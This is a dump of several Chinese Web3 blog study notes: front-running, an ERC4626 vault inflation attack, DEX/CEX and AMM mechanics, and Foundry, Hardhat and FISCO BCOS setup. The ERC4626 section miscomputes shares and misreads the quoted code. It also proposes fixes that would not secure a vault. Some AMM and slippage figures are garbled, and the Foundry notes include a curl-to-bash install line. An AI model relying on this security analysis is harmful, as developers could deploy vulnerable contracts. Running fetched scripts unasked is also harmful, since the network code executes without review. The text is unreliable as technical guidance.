调用什么方法,才可以让 msg.sender 来 withdraw 成功?\n答： approve\nFront - RunningFront-Running 是指恶意节点（FrontRunner）通过监控待处理交易池（Mempool），以更高 Gas 费抢在目标交易（User’s Transaction）之前执行自己的交易，从而获利的行为。以下是分步拆解：\n\n1. 用户发起交易\n用户提交一笔交易（如购买代币、调用智能合约）到以太坊网络。  \n交易进入待处理池（Mempool），等待矿工&#x2F;验证者打包。\n\n2. 恶意节点监控交易池\nFrontRunner（通常是机器人）实时扫描Mempool，识别有利可图的交易：  \n例如：用户的大额代币买单（可能推高价格）。  \n或套利机会（如DEX价格偏差）。\n\n\n\n3. 发起抢先交易\n策略：  \n复制用户交易逻辑（如购买同种代币）。  \n设置更高Gas费，吸引矿工优先打包。\n\n\n结果：  \n恶意交易被优先执行，用户交易因Gas低而延后。\n\n\n\n4. 获利手段\n低买高卖：抢在用户买单前低价购入代币，待用户交易推高价格后卖出。  \n套利：利用DEX价格延迟，在用户交易前完成价差套利。  \n操纵合约：针对拍卖类合约，提前锁定优势条件。\n\n\n技术实现依赖\n交易透明性：以太坊Mempool公开可见，便于监控。  \nGas竞价机制：矿工优先打包高Gas交易。  \n智能合约可预测性：若合约逻辑固定，攻击者可模拟结果。\n\n\n防御方案\n隐私交易：使用Flashbots等隐私RPC，避免交易暴露在公开Mempool。  \n限价单&#x2F;滑点控制：设置交易价格上限，减少被利用空间。  \n合约级防护：  \n提交-揭示模式（Commit-Reveal Scheme）。  \n随机化关键操作（如拍卖截止时间）。\n\n\n\n\n典型案例\nDeFi套利：2020年Uniswap上多次出现抢跑套利，单笔获利超万美元。  \nNFT铸造：热门项目公售时，机器人抢先铸造稀缺资产。\n\nFront-Running本质是利用区块链透明性和激励机制的设计缺陷，是Web3中典型的”黑暗森林”攻击。\nERC4626 通胀攻击（Inflation Attack）攻击背景ERC4626 是代币化金库（Vault）标准，允许用户存入资产（assets）并获取份额（shares）。攻击者通过操纵金库的 资产-份额转换比例，在特定条件下实现“凭空增发份额”的漏洞。\n\n攻击场景示例假设初始状态：\n\n用户存入资产：assets_deposited = 1,000\n当前总份额：totalSupply() = 1,000\n金库总资产：totalAssets() = 1,000,000此时，用户预期获得的份额应通过公式计算：  12shares_received = assets_deposited * totalSupply() / totalAssets()= 1,000 * 1,000 / 1,000,000 = 1 share\n\n\n漏洞触发点问题出在 _convertToShares 函数的实现：  \n12345678function _convertToShares(uint256 assets, Math.Rounding rounding)     internal view virtual returns (uint256) &#123;    return assets.mulDiv(        totalSupply() + 10 ** _decimalsOffset(),         totalAssets() + 1,  // 关键问题：分母被 +1 操纵        rounding    );&#125;\n攻击步骤：\n\n初始状态：金库刚部署，totalSupply = 0，totalAssets = 0。\n攻击者首次存款：  \n存入极少量资产（如 1 wei），此时：  1shares = 1 * (0 + 1e18) / (0 + 1) = 1e18 shares\n攻击者以 1 wei 的成本获得 1e18 份额（天文数字）。\n\n\n正常用户存款：  \n用户存入 1,000 资产时，因 totalSupply 被攻击者通胀：  1shares = 1,000 * (1e18 + 1e18) / (1 + 1,000) ≈ 2e18 / 1,001 ≈ 2e15 shares\n用户实际获得的份额远低于预期，大部分价值被攻击者稀释。\n\n\n\n\n攻击核心逻辑\n分母操纵：totalAssets() + 1 的设计在初始状态下（totalAssets=0）会放大份额计算。\n份额通胀：攻击者通过极低成本获取大量份额，后续用户的存款被严重稀释。\n\n\n防御方案\n初始化保护：  \n\n在金库部署时预铸少量份额给零地址（如 1e18），避免 totalSupply=0 的极端情况。1234function __ERC4626_init(address asset, uint256 initialDeposit) internal &#123;    _mint(address(0), 1e18); // 预铸份额    _deposit(initialDeposit, msg.sender); // 初始存款&#125;\n\n\n公式修正：  \n\n移除分母的 +1 逻辑，直接使用 assets * totalSupply / totalAssets。\n\n\n最小存款限制：  \n\n要求首次存款必须超过一定阈值（如 1e18 wei），提高攻击成本。\n\n\n\n\n真实案例\n2022 年多个未实现防护的 ERC4626 金库（如某些收益聚合器）因此漏洞被攻击，导致用户份额价值被稀释。\n\n总结：ERC4626 通胀攻击利用了初始状态下的数学漏洞，开发者需严格检查资产-份额转换公式的边界条件！\n\nhttps://docs.openzeppelin.com/contracts/4.x/erc4626\n\n","url":"2025/07/24/ERC4626详解/","date":"2025-07-24"},{"title":"DEX&CEX","content":"DEX &amp; CEXCEX vs DEX 核心知识点总结1. CEX（中心化交易所）\n托管模式：用户资产由交易所控制，存在平台跑路风险。\n透明度低：交易记录不公开，依赖交易所的内部账本。\n流动性来源：主要依赖专业做市商提供深度。\nKYC要求：必须完成身份认证才能交易（合规要求）。\n典型代表：Binance、Coinbase、Kraken。\n\n2. DEX（去中心化交易所）\n非托管模式：用户自持私钥，资产存于个人钱包（如MetaMask）。\n链上透明：所有交易记录公开可查（如Etherscan）。\n流动性来源：\nAMM 模式（如Uniswap）：依赖流动性池（LP提供）。\n订单簿模式（如dYdX）：可能结合做市商。\n\n\n无需许可：无需KYC，支持匿名交易。\n典型代表：Uniswap、SushiSwap、dYdX。\n\nToken的作用？\n作为数字资产在区块链上流通  \n代表项目权益或使用权  \n提供激励机制（如质押、治理）  \n增强生态内流动性\n\n\n早期融资：帮助项目方（尤其是小团队）筹集启动资金（如通过IDO&#x2F;IEO）。\n社区治理：代币持有者可参与DAO投票，影响项目决策（如Uniswap的UNI）。\n生态功能：\n支付Gas费（如ETH、BNB）。\n质押赚取收益（如DeFi挖矿）。\n\n\n早期参与机会：允许散户在项目早期投资，分享成长红利。\n\nwhy we need Token?\n早期投资机会：为个人投资者提供早期参与项目的途径。  \n\n项目筹资：帮助小型项目或内容创作者在初期阶段募集资金。  \n\n社区治理：通过代币持有者投票实现去中心化决策。  \n\n功能代表：代币可充当特定用途（如支付链上Gas费）。  \n如何使同质化代币（Fungible Tokens）被广泛接受并易于交换？\n中心化交易所（CEX）：如Binance、Coinbase，提供高流动性但需信任第三方。  \n去中心化交易所（DEX）：如Uniswap，通过AMM机制实现无需许可的交易。  \n场外交易（OTC）：大额直接交易，避免市场滑点。\n\n\n\n交易所的作用为代币提供更高的流动性，促进交易效率。\n四种交易机制四种交易机制对比\n\n\n机制类型\n核心原理\n代表项目\n优缺点分析\n\n\n\nCLOB\n- 中央限价订单簿模式- 买卖双方挂限价单- 交易所进行订单匹配\nBinance, Coinbase\n✅ 价格发现高效❌ 需要足够流动性❌ 中心化风险\n\n\nAMM\n- 算法自动做市（如x*y&#x3D;k）- 流动性池定价- 用户与合约交互\nUniswap, PancakeSwap\n✅ 无需订单簿✅ 7x24自动运行❌ 大额交易滑点高\n\n\nRFQ\n- 询价交易模式- 交易者请求报价- 做市商提供报价\n0x协议, 1inch\n✅ 适合大额交易✅ 价格优化❌ 依赖做市商网络\n\n\nOracle-based\n- 依赖预言机喂价- 链外价格输入链内- 用于衍生品&#x2F;借贷清算\nGMX, Synthetix\n✅ 价格准确❌ 预言机风险❌ 中心化依赖\n\n\n关键区别\n定价方式  \n\nCLOB&#x2F;AMM：内生价格（订单簿&#x2F;公式计算）  \nRFQ&#x2F;Oracle：外生价格（做市商&#x2F;预言机）\n\n\nUniswap定位  \n\n纯AMM机制，核心依赖流动性池  \n仅辅助使用预言机（如TWAP价格预言机）\n\n\n适用场景  \n\n现货交易：AMM &gt; CLOB  \n大额交易：RFQ &gt; AMM  \n衍生品交易：Oracle &gt; AMM\n\n\n\nFungible Token Market Place（同质化代币市场）的分类和示例\nCEX（中心化交易所）\n\n由中心化机构运营，用户托管资产，依赖订单簿匹配交易。\n常见示例：Binance、Coinbase、Kraken（图中未列出具体名称）。\n\n\nDEX（去中心化交易所）\n\n通过智能合约实现链上交易，用户自托管资产，分为多种技术类型：\nAMM DEX（自动化做市商）\n通过流动性池和算法定价（如 x⋅y&#x3D;kx⋅y&#x3D;k）。\n示例：Uniswap v1&#x2F;v2&#x2F;v3、Curve（专注稳定币）、Balancer（自定义资金池）。\n\n\nOrderbook DEX（订单簿模式）\n类似传统交易所的买卖挂单模式，但链上执行（如Serum）。\n\n\n其他创新类型：\nGLOB（全局订单簿）: dYdX（衍生品交易）。\nvAMM（虚拟AMM）: Perpetual Protocol（永续合约，无需真实流动性）。\nOracle-based（预言机驱动）: GAIX（依赖外部预言机报价）。\nRFO（请求报价）: Hashflow、Paradigm（做市商按需报价）。\n\n\n\n\n\n\nOTC（场外交易）\n\n点对点大宗交易，通常通过协商定价，避免滑点。\n常见场景：机构间直接交易或通过OTC平台（如Circle Trade、Genesis）。\n\n\n\n\n分类\n特点\n优缺点\n\n\n\nCEX\n中心化运营，订单簿匹配，用户资产托管。\n✅ 效率高、流动性好；❌ 需信任机构，存在监管风险。\n\n\nDEX\n去中心化，智能合约交易，用户自托管资产。\n✅ 去信任化、抗审查；❌ 技术限制（滑点、延迟、高Gas费）。\n\n\nOTC\n点对点协商定价，场外大宗交易。需通过可信中介或平台完成交易\n✅ 无滑点、适合大额；❌ 流动性依赖对手方，透明度低。\n\n\n\n\n\nDEX交易所特点（对比CEX）\nNon-custodial（非托管）\n\n用户自主掌控资产，无需依赖第三方托管。\n\n\n**Open (global access)**（开放，全球可访问）\n\n无许可限制，任何人可参与，不受地域或身份约束。\n\n\nTransparent（透明）\n\n所有交易和规则通过区块链公开可查，代码开源。 \n从这条也可以得出dex的效率更高：\n\n\n可以在其他链上互搭，做延展工作\n社区治理更便利\n\n\nComposable（可组合性）\n\n协议间可相互调用和集成（如“货币乐高”），提升创新效率。\n\n\nDecentralized（去中心化）\n\n无单一控制节点，由分布式网络或社区治理。\n\n\n\n区别（DEX vs. CEX）\n\n\n对比维度\nCEX（中心化交易所）\nDEX（去中心化交易所）\n\n\n\n托管方式\n✅ 托管（用户资产由平台控制）\n❌ 非托管（用户自持私钥）\n\n\n流动性提供方\n做市商（market maker）\n散户（通过流动性池参与）(Retail)\n\n\n准入权限\n需KYC（身份验证）\n无许可（匿名访问）\n\n\n透明度\n不透明（黑箱操作，数据不公开）\n透明（链上数据可查）\n\n\n可组合性\n❌ 无法与其他协议交互\n✅ 可组合（如“DeFi乐高”）\n\n\n信用风险\n存在（依赖平台信誉）\n无（依赖智能合约代码）\n\n\n信任基础\n机构或个人（需信任第三方）\n代码（去中心化执行）\n\n\n\n第一个DEX：Uniswap\nAMM机制（Automated Market Maker）：通过流动性池自动定价，取代传统订单簿（CLOB）  \n无偿损失（Impermanent Loss）：流动性提供者因价格波动产生的潜在损失，Uniswap通过交易费补贴  \n滑点问题：大额交易可能导致执行价格偏离预期\n\n【1】\n\n举例：\n动化做市商 (x*y &#x3D; C)案例研究：什么是无常损失？代币对：苹果&#x2F;橙子当 T &#x3D; T0 时，苹果-橙子余额为 x0&#x3D;50，y0&#x3D;50，价格比例为 1:1当 T &#x3D; T1 时，1 苹果 &#x3D; 10 橙子\n问题：现在的苹果-橙子余额 x1, y1 是多少？\n解决方案：C &#x3D; 50x50 &#x3D; 2500新余额 x1xy1 &#x3D; C &#x3D; 2500，且 y1&#x3D;10*x1因此，x1 ≈ 16，y1 ≈ 160当价格为 1:1 时，流动性提供者(LP)有 55 苹果，现在在 T1 时，流动性提供者只有 32 苹果\nWho take away这些无偿损失:\n在自动化做市商（AMM）模型中，无常损失（Impermanent Loss）并不是被某个特定的人或实体“拿走”的，而是流动性提供者（LP）因市场价格波动而产生的机会成本。具体来说：\n\n无常损失的本质：\n当代币价格比率发生变化时，AMM 会自动调整资金池中的代币数量（遵循 x⋅y&#x3D;Cx⋅y&#x3D;C 的公式），导致LP持有的代币组合价值低于单纯持有原始数量时的价值。\n这种“损失”是相对于“未提供流动性，而是单纯持有代币”的情况而言的。\n\n\n谁“受益”了？\n套利者（Arbitrageurs）：当市场价格变化时，套利者会通过AMM池的低买高卖获利，导致池内代币比例调整，而LP的代币数量随之变化。\n其他市场参与者：LP实际上是为交易者提供流动性服务，无常损失可以视为LP为赚取交易手续费而承担的风险成本。\n\n\n为什么叫“无常”？\n如果价格比率恢复到初始状态（如案例中从1:10回到1:1），这种损失会消失。但若价格未回归，损失则成为永久性的。\n\n\n关键点：\n无常损失并非被恶意窃取，而是AMM机制和市场价格波动共同作用的结果。\nLP通过交易手续费补偿这部分损失，但若手续费收入不足以覆盖无常损失，则可能净亏损。\n\n\n\n简单总结：无常损失是LP因提供流动性而承担的市场风险，其“受益者”是套利者和交易者，但这是去中心化交易所正常运行的必要机制。\n无偿损失——uniswap用交易费补贴\n\nUniswap核心特点\n交易量越高，流动性提供者收益越大  （交易量越高，越赚）\nConcentrated Liquidity（集中流动性）：Uniswap v3允许流动性集中在特定价格区间，提升资本效率\n\n优点（Pros）\n数学设计优雅：基于简单的数学公式（如 x⋅y&#x3D;Cx⋅y&#x3D;C），机制透明且可预测。\n无需信任的交易：用户无需依赖中介，可直接通过智能合约交易。\n散户可参与流动性提供：降低了做市门槛，普通用户也能成为流动性提供者（LP）。\n无需许可上架长尾资产：任何项目方均可自由上线代币，无需传统审核流程。\n\n缺点（Cons）\n滑点高：大额交易会因流动性不足导致价格大幅偏离预期。\n无常损失严重：价格波动时，LP可能面临显著的资产价值损失。\nMEV抢跑：矿工或机器人通过提前交易（Front Running）获利，损害普通用户利益。\n\n\n关键概念\nMEV（Maximal Extractable Value）：矿工或验证者通过交易排序获取的额外收益  \nDeFi衍生品：如期货、期权等，dYdX协议是典型代表（但仍存在滑点问题）  \nBasket：一篮子资产组合，可能包含波动性不同的代币  \n稳定币：价格锚定法币（如USDT、DAI）的加密货币，用于降低波动风险  \nDepaid:\n量化：\n\n\n一些DEX的衍生品DeFi永续合约现状市场潜力分析\nCeFi永续合约规模：2021年交易量达$57万亿  \nDeFi永续合约现状：仅占3%（$1.7万亿），远低于现货交易占比（10%）  \n增长空间：若达到现货比例，DeFi永续合约有7%的潜在增长空间（约$4万亿）\n\n核心挑战\n流动性要求：需深度流动性支持  \n价格准确性：长尾资产易被操纵  \n技术需求：快速最终性与结算效率\n\n\ndYdX协议（CLOB模式）定位：去中心化衍生品交易所标杆  \n技术架构\n\n底层技术：基于StarkWare扩容方案  \n混合架构：✅ 链下订单匹配✅ 链上结算\n\n核心优势\n\n流动性来源：机构做市商参与  \n资产安全：用户钱包自托管  \n体验优化：提供CEX级交易体验\n\n但还存在“uniswap滑点”问题\n** GMX - Oracle-based Orderbook（基于预言机的订单簿）**\n底层链：基于 Arbitrum（以太坊 Layer 2 扩容方案）。\n订单匹配与结算：\n链上订单匹配：通过智能合约完成订单撮合。\n链上结算：所有交易最终在链上结算，保证透明性。\n\n\n核心机制：\nOracle-based（基于预言机）：价格依赖外部预言机（如 Chainlink）提供实时市场数据，而非依赖链上流动性池。\nBasket of tokens（一篮子代币流动性）：\n含义：GMX 的流动性池由一篮子主流资产（如 ETH、BTC、稳定币）组成，用户交易时共享这些资产的综合流动性。\n波动风险：篮子中代币的价格波动会影响整体流动性价值，例如 ETH 暴跌可能导致池内资产缩水。\n\n\n\n\n用户控制权：用户始终掌握钱包资产所有权（非托管）。\n\n\nPerp - vAMM Order Book（虚拟自动化做市商订单簿）\n底层链：基于 Optimism（以太坊 Layer 2 扩容方案）。\n\n订单匹配与结算：\n\n链上订单匹配与结算：与 GMX 类似，完全在链上执行。\n\n\n核心机制：\n\nvAMM（虚拟自动化做市商）：\n采用类似 Uniswap v3 的集中流动性模型，但资金池是“虚拟的”（无需实际存入代币）。\n交易价格由 vAMM 的数学公式计算，流动性提供者（LPs）通过提供资金赚取费用。\n\n\nUniswap v3 流动性：可能与 Uniswap v3 的流动性池联动，增强深度。\n\n\n用户控制权：同样是非托管模式，用户自有钱包资产。\n核心概念解释\nBasket（一篮子代币）：GMX 将多种资产聚合为一个共享流动性池，优点是提高资金利用率，但代币价格波动会直接影响池内资产总值。\nvAMM（虚拟 AMM）：Perp 通过虚拟池模拟传统 AMM 的流动性，实际结算时依赖抵押资产，减少无常损失风险。\n\n\n适用场景\n\nGMX：适合希望交易主流资产、依赖预言机公正价格的用户，但需承担篮子资产波动风险。\nPerp：适合偏好 Uniswap v3 式流动性模型、追求更低滑点的衍生品交易者。\n\n\n\n补充“集中流动性（Concentrated Liquidity）” 在 Curve 和 Uniswap v3 中的实现方式与传统 AMM（如 Uniswap v2）的关键区别：\n传统 AMM（如 Uniswap v2）的流动性分布\n流动性均匀分布在 整个价格范围（0 → ∞），即无论价格如何变动，LP 提供的资金都会被动用于所有可能的交易对价格。\n这导致 资本效率低下，因为大部分流动性很少被用到（例如稳定币交易对通常只在 1:1 附近波动）。\n\n集中流动性（Concentrated Liquidity）的改进（Uniswap v3 和 Curve 的不同实现）\n\nUniswap v3 的方式：\nLP 可以 自定义流动性提供的价格区间（例如 ETH&#x2F;USDC 只在 1800−1800−2200 之间提供流动性）。\n优点：资本效率大幅提高，同样的资金在特定区间能提供更深度的流动性，减少滑点。\n缺点：LP 需要主动管理价格区间，若价格超出范围则停止赚取手续费，并可能面临更高的无常损失。\n\n\nCurve 的方式（如 Curve v2）：\n针对 稳定币或锚定资产 优化，流动性自动 集中在市场最可能交易的窄幅价格区间（如 0.99-1.01）。\n采用 动态调整算法，当价格偏离时，流动性池会自动重新平衡，减少无常损失。\n优点：在稳定币交易对中滑点极低，适合高频交易。\n\n\n\n核心区别总结\n\n\n特性\nUniswap v3\nCurve (v2)\n\n\n\n目标资产\n波动性资产（如 ETH）\n稳定币&#x2F;锚定资产\n\n\n流动性分布\n自定义区间（手动）\n动态窄幅区间（自动）\n\n\n资本效率\n高（需主动管理）\n极高（自动优化）\n\n\n无常损失\n较高（价格超出区间）\n较低（动态再平衡）\n\n\n简单来说：\n\nUniswap v3 让 LP 自己选择流动性集中的价格段，适合波动大的资产。\nCurve 自动把流动性集中在最可能交易的窄范围，特别适合稳定币。\n两者都比传统 AMM（全范围流动性）更高效，但管理方式和适用场景不同。\n\n关于 集中流动性做市（Concentrated Liquidity Market Making, CLMM） 的核心优势和应用场景\n\n为什么需要集中流动性做市（CLMM）？\n降低无常损失（Reduce Impermanent Loss）  \n\n传统AMM（如Uniswap v2）的流动性分布在全价格范围（0→∞），导致价格波动时LP损失较大。  \nCLMM允许流动性集中在高频交易区间，减少因价格偏离带来的无常损失。\n\n\n降低交易滑点（Reduce Trading Slippage）  \n\n流动性集中在特定价格区间（如Uniswap v3的自定义范围或Curve的稳定币窄幅区间），使得相同资本能提供更深度的流动性，大幅降低大额交易的滑点。\n\n\n稳定币兑换的优化（Why Stablecoin Swap?）  \n\n稳定币交易对（如USDC&#x2F;USDT）通常围绕1:1价格波动，CLMM可针对性提供超低滑点兑换，催生了“Curve Wars”（协议争抢Curve流动性以提高自身代币收益）。\n\n\nUST脱钩事件的影响（What Happened After UST Depeg?）  \n\n2022年UST崩盘导致Curve的UST&#x2F;3Pool流动性池严重失衡，引发连锁清算，暴露了CLMM在极端行情下的风险。  \n此后，Curve和AAVE等协议纷纷推出新的稳定币解决方案（如Curve v2的动态费率调整、AAVE的GHO稳定币），以增强系统稳定性。\n\n\n\n\nCurve vs. Uniswap v3 的CLMM设计差异\n\n\n目标\nUniswap v3\nCurve\n\n\n\n适用资产\n波动性资产（ETH&#x2F;BTC等）\n稳定币&#x2F;锚定资产（USDC&#x2F;USDT）\n\n\n流动性分配\nLP手动设置价格区间\n自动集中在1:1附近窄幅区间\n\n\n无常损失\n较高（若价格超出区间）\n极低（动态再平衡）\n\n\n典型案例\nETH&#x2F;USDC交易对\nCurve 3Pool（DAI&#x2F;USDC&#x2F;USDT）\n\n\n\n核心结论\nCLMM通过集中流动性提升资本效率，但需权衡管理复杂度（如Uniswap v3）或依赖算法稳定性（如Curve）。  \n稳定币赛道是CLMM的主战场（Curve Wars），但极端风险（如UST脱钩）仍需风控机制。  \n未来CLMM可能进一步分化：Uniswap v3适合波动资产，Curve主导稳定币，而AAVE等协议尝试创新解决方案。\n\n（注：图中提到的“Curve, AAVE both announced stablecoin solution”指两大协议在UST事件后推出的稳定币相关优化，如Curve v2的紧急费率调整、AAVE的GHO稳定币等。）\n一、为什么提供流动性（LP）？1. 收益（Rewards）\n\n交易手续费分成：LP通过用户交易赚取手续费（如Uniswap通常为0.3%）。\n额外激励：部分协议（如Curve、Sushi）提供代币奖励（流动性挖矿）。\n资本效率提升：集中流动性（如Uniswap v3）可提高资金利用率，获得更高收益。\n\n2. 风险（Risks）\n\n无常损失（Impermanent Loss）：价格波动导致LP资产价值低于单纯持有时的损失。\n智能合约风险：漏洞或黑客攻击可能导致资金损失（如2021年Poly Network事件）。\n流动性范围失效（CLMM中）：若价格超出集中区间（Uniswap v3），LP停止赚取手续费。\n代币贬值风险：若提供流动性的代币本身价格暴跌（如UST脱钩），损失加剧。\n\n3. 适用场景\n\n适合长期看好某代币对的投资者，或通过高频复利（如稳定币池）对冲无常损失。\n\n\n二、为什么选择Uniswap（DEX）而非CEX？1. 去中心化优势（DEX Pros）\n\n无需信任（Trustless）：用户自托管资产，无需依赖中心化机构（避免FTX式暴雷）。\n无需KYC：匿名交易，保护隐私。\n抗审查：上架资产无需许可，支持长尾代币（如MEME币、新项目）。\n创新交易模式：如CLMM、闪电贷等，CEX难以实现。\n\n2. 中心化交易所劣势（CEX Cons）\n\n资金风险：用户资产由交易所控制，存在挪用或跑路风险。\n交易限制：提现冻结、地域合规限制（如Binance退出部分国家）。\n高滑点：部分小币种流动性不足，大额交易成本高。\n\n3. 例外情况（CEX更优的场景）\n\n法币出入金：CEX支持直接法币兑换（如Coinbase）。\n高频&#x2F;衍生品交易：CEX提供更低延迟和丰富工具（如期货、杠杆）。\n\n三、什么是Uniswap 滑点问题Uniswap 滑点问题是指用户在去中心化交易所（DEX）如 Uniswap 上进行代币交易时，实际成交价格与预期价格之间的偏差。这种偏差主要由以下原因引起：\n\n滑点的本质  定义：滑点是交易执行时的价格与提交交易时的预期价格之间的差异。例如，你希望以 1 ETH &#x3D; 2000 USDT 的价格卖出 ETH，但实际成交价可能是 1995 USDT。\n\n  原因：Uniswap 采用自动做市商（AMM）模型，价格由资金池中的代币比例决定。大额交易会显著改变池中代币比例，导致价格波动。\n\n主要影响因素\n\n\n交易规模：交易量占资金池比例越大，滑点越高。例如，在小资金池中卖出大量代币会大幅压低价格。\n市场流动性：流动性低的代币对（如新币或小众币种）滑点更高，因为资金池深度不足。\n网络拥堵：交易延迟时（如以太坊网络拥堵），市场价格可能在此期间变动，加剧滑点。\n\n  用户如何应对滑点\n\n设置滑点容忍度：在交易时自定义滑点限制（如 0.5%）。若市场价格波动超过该值，交易将失败以避免损失。\n分拆大额交易：将大单拆分为多个小单，减少对价格的一次性冲击。\n选择高流动性池：交易主流币对（如 ETH&#x2F;USDC）时滑点更低。\n使用限价单或聚合器：通过 Uniswap 的限价单功能或 1inch、Matcha 等聚合器寻找更优路径。\n\n  滑点与 MEV 的关系\n\n抢跑攻击（Frontrunning）：矿工或机器人可能通过提高 Gas 费优先执行交易，利用用户的滑点设置套利。Uniswap v3 引入了“滑点保护”功能来缓解此类问题。\n\n\n  示例\n  假设一个 ETH&#x2F;USDC 池中有 100 ETH 和 200,000 USDC（1 ETH &#x3D; 2000 USDT）。若用户试图卖出 10 ETH：\n\n交易后池变为 110 ETH 和 200,000 - (10 ETH * 实际价格) USDC。\n由于公式 x * y = k，实际获得的 USDC 可能低于 20,000（如 19,800），产生 1% 的滑点。\n\n四、什么是IPO？​\tInitial Public Offering (IPO) 是指公司首次向公众发行股票，通常在传统金融市场中用于筹集资金。在加密货币领域，类似的概念可能包括代币首次发行（ICO、IDO等）。\n","url":"2025/03/29/DEX/","date":"2025-03-29"},{"title":"Foundry框架","content":"定义Foundry 是一个由 Paradigm开发的智能合约开发工具包，用于在以太坊区块链上开发应用程序。Foundry 基于 Rust 运行，提供多种工具来开发和测试 Solidity 智能合约。Foundry 具有一套 CLI 命令，使创建新项目、编译、部署和与合约交互变得简单。\n创建Foundry项目\n安装命令：\n\n12curl -L &lt;https://foundry.paradigm.xyz&gt; | bash  //下载foundryupfoundryup   //运行它安装 Foundry\n\n\n安装后，有三个命令行工具 forge, cast, anvil 组成\n\nforge: 用来执行初始化项目、管理依赖、测试、构建、部署智能合约 ;\ncast: 执行以太坊 RPC 调用的命令行工具, 进行智能合约调用、发送交易或检索任何类型的链数据\nanvil: 创建一个本地测试网节点, 也可以用来分叉其他与 EVM 兼容的网络。\n\n\n\n初始化\n\n通过 forge 的 forge init 初始化项目\n1forge init &lt;project_name&gt;\n\ninit 命令会创建一个项目目录，并安装好forge-std 库。\n如需手动安装依赖库使用： forge install forge/forge-std\n创建好的 Foundry 工程结构:\n12345678910111213&gt; tree -L 2.├── foundry.toml //配置文件，配置连接的网络URL 及编译选项├── lib //依赖库目录│   └── forge-std├── script //部署脚本文件│   └── Counter.s.sol├── src //智能合约目录│   └── Counter.sol└── test //智能合约测试用例文件夹    └── Counter.t.sol5 directories, 4 files\n\n\n\nFoundry 使用 Git submodule 来管理依赖库， .gitmodules 文件记录了目录与子库的关系\n\n合约开发&amp;编译\n\n编写合约\n在foundry.toml 中使用solc配置编译器版本\n编译合约\n1forge build\n\n\n测试\n\n参考学习原文链接：https://decert.me/tutorial/solidity/tools/foundry/\n","url":"2025/05/24/Foundry框架/","date":"2025-05-24"},{"title":"Hardhat框架","content":"定义Hardhat 是一个由 Nomiclabs 构建和维护的以太坊智能合约开发环境。它是一个可扩展的 Javascript 框架，提供了一套管理智能合约生命周期的工具和功能，包括编译、部署、测试和调试。\n可以用npm直接安装：\n12npm install hardhatnpx hardhat init\n\n\n\n\n高度可定制性：Hardhat 的插件系统允许开发者通过自定义插件扩展其功能。\n\nHardhat 使用 Node 进行包管理，如果你熟悉 Node 及 Javascript， Hardhat 将非常简单上手。\n创建Hardhat项目\n创建项目目录\n\n12mkdir hardhat-tutorialcd hardhat-tutorial\n\n\n初始化Node项目\n\n1npm init\n\n\n\n\n安装Hardhat\n\n1npm install --save-dev hardhat\n\n\n将hatdhat添加到 package.json 的 devDependencies 中，而不是 dependencies 中\n\n\n在安装Hatdhat的目录下运行\n1npx hardhat\n\n\n\n使用键盘选择”创建一个新的hardhat.config.js（Create a JavaScript project）” ，然后回车。\n\n\n\n这个 JavaScript Hardhat 工程会默认下载 hardhat-toolbox 插件及一些常规设置：\n\n\n创建好的Hardhat工程包含文件有：\n\n\ncontracts：智能合约目录\nscripts ：部署脚本文件\ntest：智能合约测试用例文件夹。\nhardhat.config.js：配置文件，配置hardhat连接的网络及编译选项。\n\n\n编写合约\n\n可以开始编写合约了（contracts）目录下\n推荐使用 OpenZepplin 等第三方库\n安装：\n1npm install @openzeppelin/contracts --save-dev\n\n在合约中直接import:\n1import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;\n\n\n\n\n编译合约\n\n可以直接在终端运行：\n1npx hardhat compile\n\n以编译合约。\n 成功编译后，会在artifacts/contracts/目录下生成Counter.json 和 build-info\n\nCounter.json包含了智能合约的 ABI 、字节码（Bytecode）等。\ntip:\n智能合约的 ABI（Application Binary Interface）信息，其中包括了合约的函数、事件等接口信息。这个文件通常会在与其他合约交互时使用，因为它可以被其他合约和 DApp 使用。\nBytecode 是部署合约所需的字节码（也称为创建时字节码），部署合约时，就是把该字节码作为交易的输入数据发送链上。\n\n\n测试\n基于ether.js与前面的合约交互，为智能合约编写自动化测试。\n测试命令\n1npx hardhat test\n\n\n\n部署合约\n\n\n我们需要编写一个部署脚本。在scripts文件夹，新建一个deploy.js 用来写部署脚本。\n运行\n1npx hardhat run scripts/deploy.js\n\n 时， 可以合约会部署到Hardhat 内置网络上。\n123&gt; npx hardhat run scripts/deploy.jsCounter address: 0x5FbDB2315678afecb367f032d93F642f64180aa3\n\n为了在运行任何任务时指示Hardhat连接到特定的EVM网络，可以使用--network参数\n1npx hardhat run scripts/deploy.js --network &lt;network-name&gt;\n\n\n\n参考还有更多比如：编写测试用例，console.log,\nnetwork-name 在 hardhat.config.js 文件中的配置   ，代码开源验证，Hardhat 插件（Plugin）的使用…\n阅读本笔记的学习参考原文：：https://decert.me/tutorial/solidity/tools/hardhat\n","url":"2025/05/24/Hardhat/","date":"2025-05-24"},{"title":"FISCO BCOS联盟链","content":"FISCO BCOS介绍FISCO BCOS 是一个稳定、高效、安全的区块链底层平台。联盟链需要多家机构来组成联盟，所以FISCO BCOS 支持多群组概念，这意味着多个组织可以通过FISCOBCOS的联盟链组成多个联盟，而且联盟中可以允许共同的组织节点。如下图所示，在多群组技术下FISCO BCOS可以支持众多应用领域。\n逻辑架构以下是FISCO BCOS 的逻辑架构，分为：基础层、互联核心层、链核心层、管理层和接口层。\n\n基础层\n基础层提供区块链的基础数据结构和算法库，包括密码学算法、隐私算法等。\n链核心层\n链核心层主要实现区块链的链式数据结构和数据存储（分布式存储），采用了不同的数据库（LevelDB、MySQL、Qracle）来存储区块数据。\n互联核心层\n互联核心层实现了区块链的基础 P2P 网络通信、共识机制和区块同步机制。\n管理层\n相对于区块链基础架构，FISCO BCOS 细分出了管理层，实现区块链的管理功能，比如说参数配置、账本管理等。\n接口层\n接口层主要对应的是应用层，面向区块链用户，提供交互式控制台与各类应用接口。同时还包括智能合约与DApp。\n区块链交易流程区块链引入智能合约后，交易便超 脱『价值转移』的原始定义，其更 加精准的定义应该是区块链中一次 事务的数字记录。无论大小事务， 都需要交易的参与。\n下图展示了FISCO BCOS区块 链交易的完整生命周期。客户 端一般是交易创建与发起的位 置，随后交易接入相关节点进 行验签与广播；之后交易会进 入节点交易池内，并在共识节 点处完成交易的执行；最后整 个区块链网络上的节点可以来 